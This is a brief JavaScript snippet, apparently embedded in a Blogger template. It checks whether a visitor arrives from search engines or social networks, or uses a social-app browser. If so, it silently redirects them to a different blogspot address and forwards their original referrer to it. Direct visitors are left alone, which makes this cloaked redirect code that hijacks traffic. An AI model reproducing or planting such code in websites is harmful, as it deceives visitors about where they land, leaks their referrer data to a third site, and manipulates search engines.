var postTitles = &quot;<data:blog.searchQuery/>&quot;;
  //<![CDATA[
var ars = 'https://alxalalive.blogspot.com';

if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/search?q=' + encodeURIComponent(postTitles) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
//]]>
